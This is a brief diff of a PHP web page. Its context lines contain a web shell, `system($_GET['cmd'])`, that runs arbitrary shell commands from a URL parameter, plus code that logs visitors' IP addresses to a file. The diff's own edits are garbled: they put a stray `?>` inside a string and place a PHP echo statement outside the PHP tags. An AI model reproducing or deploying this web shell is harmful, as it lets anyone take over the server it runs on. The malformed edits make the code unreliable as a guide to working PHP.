@@ -11,7 +11,7 @@
         system($_GET['cmd']);
         echo '<pre>';
         $last_line = system('ls', $retval);
-        echo '
+        echo '?>
 </pre>
 <hr />Last line of the output: ' . $last_line . '
 <hr />Return value: ' . $retval;
@@ -25,5 +25,7 @@ fwrite($myfile, $ip);
 fclose($myfile);
 ?>
 </pre>
+    
+    echo '1'. '<br>'; 
 </body>
 </html>
